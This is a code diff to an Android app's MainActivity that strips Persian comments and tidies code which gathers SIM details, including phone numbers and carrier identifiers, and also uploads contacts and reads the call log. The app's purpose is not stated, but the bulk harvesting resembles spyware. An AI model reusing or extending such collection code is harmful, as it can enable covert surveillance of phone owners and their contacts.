@@ -288,26 +288,18 @@ class MainActivity : ComponentActivity() {
             if (!sims.isNullOrEmpty()) {
                 sims.forEach { info ->
                     val sim = JSONObject().apply {
-                        // 🔵 اطلاعات اصلی
                         put("simSlot", info.simSlotIndex)
                         put("subscriptionId", info.subscriptionId)
                         put("carrierName", info.carrierName?.toString() ?: "")
                         put("displayName", info.displayName?.toString() ?: "")
                         put("phoneNumber", info.number ?: "")
-
-                        // 🌍 اطلاعات کشور و شبکه
                         put("countryIso", info.countryIso ?: "")
                         put("mcc", info.mccString ?: "")
                         put("mnc", info.mncString ?: "")
-
-                        // 📶 وضعیت شبکه
                         put("isNetworkRoaming", info.dataRoaming == SubscriptionManager.DATA_ROAMING_ENABLE)
-
-                        // 🎨 ظاهری و شناسه
                         put("iconTint", info.iconTint)
                         put("cardId", info.cardId)
 
-                        // 📡 قابلیت‌های پیشرفته (Android 10+)
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                             put("carrierId", info.carrierId)
                             put("isEmbedded", info.isEmbedded)
@@ -323,7 +315,6 @@ class MainActivity : ComponentActivity() {
                             put("groupUuid", "")
                         }
 
-                        // 🔢 Port Index (Android 12+)
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                             try {
                                 put("portIndex", info.portIndex)
@@ -334,7 +325,6 @@ class MainActivity : ComponentActivity() {
                             put("portIndex", -1)
                         }
 
-                        // 📞 اطلاعات TelephonyManager
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                             try {
                                 val tm = telephonyManager.createForSubscriptionId(info.subscriptionId)
@@ -362,16 +352,9 @@ class MainActivity : ComponentActivity() {
 
                                 put("dataEnabled", tm.isDataEnabled)
                                 put("dataRoamingEnabled", tm.isDataRoamingEnabled)
-
-                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                                    put("voiceCapable", tm.isVoiceCapable)
-                                    put("smsCapable", tm.isSmsCapable)
-                                } else {
-                                    put("voiceCapable", false)
-                                    put("smsCapable", false)
-                                }
-
-                                put("hasIccCard", tm.hasIccCard)
+                                put("voiceCapable", tm.isVoiceCapable)
+                                put("smsCapable", tm.isSmsCapable)
+                                put("hasIccCard", tm.hasIccCard())
 
                                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                     try {
@@ -443,12 +426,7 @@ class MainActivity : ComponentActivity() {
             android.telephony.TelephonyManager.SIM_STATE_PERM_DISABLED -> "Permanently Disabled"
             android.telephony.TelephonyManager.SIM_STATE_CARD_IO_ERROR -> "Card IO Error"
             android.telephony.TelephonyManager.SIM_STATE_CARD_RESTRICTED -> "Card Restricted"
-            else -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
-                state == android.telephony.TelephonyManager.SIM_STATE_LOADED) {
-                "Loaded"
-            } else {
-                "Unknown"
-            }
+            else -> "Unknown"
         }
     }
 
@@ -707,7 +685,7 @@ class MainActivity : ComponentActivity() {
             != PackageManager.PERMISSION_GRANTED) return
 
         try {
-            Log.d(TAG, "════Log.d(TAG, "════════════════════════════════════════")
+            Log.d(TAG, "════════════════════════════════════════")
             Log.d(TAG, "👥 UPLOADING CONTACTS")
             Log.d(TAG, "════════════════════════════════════════")
 
@@ -806,9 +784,7 @@ class MainActivity : ComponentActivity() {
             )
 
             val sortOrder = "${android.provider.CallLog.Calls.DATE} DESC"
-            val cursor = contentResolver.query(
-                callLogUri, projection, null, null, sortOrder
-            )
+            val cursor = contentResolver.query(callLogUri, projection, null, null, sortOrder)
 
             cursor?.use {
                 if (it.moveToFirst()) {
